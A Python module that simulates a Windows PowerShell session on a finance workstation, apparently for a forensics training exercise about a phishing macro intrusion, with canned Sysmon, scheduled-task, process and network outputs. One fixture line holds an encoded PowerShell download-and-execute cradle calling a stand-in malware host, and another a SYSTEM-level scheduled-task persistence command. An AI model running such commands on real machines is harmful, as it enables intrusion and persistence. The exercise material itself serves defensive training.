"""Windows 11 endpoint device data + grammar for WS-FIN-04.

Backdrop: phishing-launched macro chain on a finance workstation
— user opens a .docm landed by a phishing email, the macro
spawns powershell.exe with an -EncodedCommand that base64-decodes
to a Net.WebClient downloader, the downloaded payload writes
itself to %ProgramData% and registers a Scheduled Task for
persistence, then beacons out to the operator over HTTPS.

The forensics surface is mainly Sysmon (process create / network /
file create / scheduled-task) plus the persistence artefacts on
disk.
"""

from __future__ import annotations

import sys

HOSTNAME = "WS-FIN-04"

BANNER = """Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

"""

AUTH_BANNER = ""
AUTH_USERNAME_PROMPT = "User name: "
AUTH_PASSWORD_PROMPT = "Password: "

PROMPT_SUFFIXES = {"user": "> "}


def PROMPT_FORMAT(host, mode, suffix):
    return f"PS C:\\Users\\REDACTED{suffix}"


# ---------------------------------------------------------------------------
# Canned outputs
# ---------------------------------------------------------------------------

GET_WINEVENT_SYSMON = """ProviderName: Microsoft-Windows-Sysmon

TimeCreated                Id  Process / Detail
-----------                --  ---------------
2026-05-15 08:31:04.122     1  Process Create  Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE  CommandLine="WINWORD.EXE" /n "C:\\Users\\REDACTED\\Downloads\\REDACTED"  ParentImage=firefox.exe  User=CORP\\REDACTED
2026-05-15 08:31:18.811     1  Process Create  Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  CommandLine=powershell.exe -nop -w hidden -ep bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc3RhZ2UyLm1hbHdhcmUtY2RuLmV4YW1wbGUvcGF5bG9hZC5wczEnKQ==  ParentImage=WINWORD.EXE  User=CORP\\REDACTED
2026-05-15 08:31:42.114     3  Network Connect Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  Protocol=tcp  DestinationIp=104.21.34.211  DestinationHostname=stage2.malware-cdn.example  DestinationPort=80
2026-05-15 08:32:01.402    11  FileCreate      Image=powershell.exe  TargetFilename=C:\\ProgramData\\Intel\\Logs\\update.exe  User=CORP\\REDACTED
2026-05-15 08:32:18.331     1  Process Create  Image=C:\\Windows\\System32\\schtasks.exe  CommandLine=schtasks.exe /create /sc minute /mo 10 /tn REDACTED /tr "C:\\ProgramData\\Intel\\Logs\\update.exe" /ru SYSTEM /f  ParentImage=powershell.exe
2026-05-15 08:32:55.041     1  Process Create  Image=C:\\ProgramData\\Intel\\Logs\\update.exe  CommandLine="C:\\ProgramData\\Intel\\Logs\\update.exe" /silent  ParentImage=svchost.exe (taskeng)  User=NT AUTHORITY\\SYSTEM
2026-05-15 08:33:42.221     3  Network Connect Image=C:\\ProgramData\\Intel\\Logs\\update.exe  Protocol=tcp  DestinationIp=REDACTED  DestinationHostname=c2.update-mirror.example  DestinationPort=443
"""

GET_SCHEDULEDTASK = """TaskPath                                       TaskName                          State
--------                                       --------                          -----
\\                                              REDACTED                  Ready
\\Microsoft\\Windows\\Defrag\\                  ScheduledDefrag                    Ready
\\Microsoft\\Windows\\TaskScheduler\\           Idle Maintenance                   Ready
\\Microsoft\\Office\\                           OfficeTelemetryAgentLogOn          Ready
"""

GET_SCHEDULEDTASK_INTEL = """TaskName    : REDACTED
TaskPath    : \\
State       : Ready
Author      : CORP\\REDACTED
Description :
Actions     : [Execute => C:\\ProgramData\\Intel\\Logs\\update.exe]
Triggers    : [TimeTrigger => every 10 minutes starting 2026-05-15 08:32:18]
Principal   : NT AUTHORITY\\SYSTEM (HighestAvailable)
"""

GET_PROCESS = """Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  ProcessName
-------  ------    -----      -----     ------     --  -----------
    411      18    25340       7212       2.41    412  explorer
    832      24    18244       5912       1.18    524  svchost
    188      11     2884       1632       0.04    448  spoolsv
    411      14    18412       6512       0.78   2104  MsMpEng
   1402      19    14844       8412       4.12   8041  update
   1188      14    18412       6512       0.78   7892  powershell
"""

GET_NETTCPCONNECTION = """LocalAddress LocalPort RemoteAddress    RemotePort State        OwningProcess
------------ --------- -------------    ---------- -----        -------------
REDACTED   52144     104.21.34.211     80         Established  7892
REDACTED   52145     REDACTED    443        Established  8041
0.0.0.0      135       0.0.0.0           0          Listen       412
0.0.0.0      445       0.0.0.0           0          Listen       4
"""

GET_CHILDITEM_PROGRAMDATA = """    Directory: C:\\ProgramData\\Intel\\Logs

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           5/15/2026  8:32 AM         163840 update.exe
-a---           5/15/2026  8:33 AM            128 update.log
"""

GET_REDACTEDUSER = """Name             Enabled Description
----             ------- -----------
Administrator    False
DefaultAccount   False
Guest            False
REDACTED             True    CORP user (domain account)
"""

WHOAMI = "corp\\REDACTED\n"


def _sysmon(s, a): return GET_WINEVENT_SYSMON
def _scheduledtask(s, a):
    # Treat any -TaskName intel-ish filter as the detail dump.
    args_lc = " ".join(a or []).lower()
    if "intel" in args_lc:
        return GET_SCHEDULEDTASK_INTEL
    return GET_SCHEDULEDTASK


def _process(s, a): return GET_PROCESS
def _nettcp(s, a): return GET_NETTCPCONNECTION
def _childitem(s, a): return GET_CHILDITEM_PROGRAMDATA
def _localuser(s, a): return GET_REDACTEDUSER
def _whoami(s, a): return WHOAMI


def _exit(s, a):
    print(); raise SystemExit


GRAMMAR = {
    "get-winevent": {"fn": _sysmon},
    "get-eventlog": {"fn": _sysmon},
    "get-scheduledtask": {"fn": _scheduledtask},
    "get-process": {"fn": _process},
    "get-nettcpconnection": {"fn": _nettcp},
    "get-childitem": {"fn": _childitem},
    "dir": {"fn": _childitem},
    "ls": {"fn": _childitem},
    "get-localuser": {"fn": _localuser},
    "whoami": {"fn": _whoami},
    "exit": {"fn": _exit},
    "quit": {"fn": _exit},
}
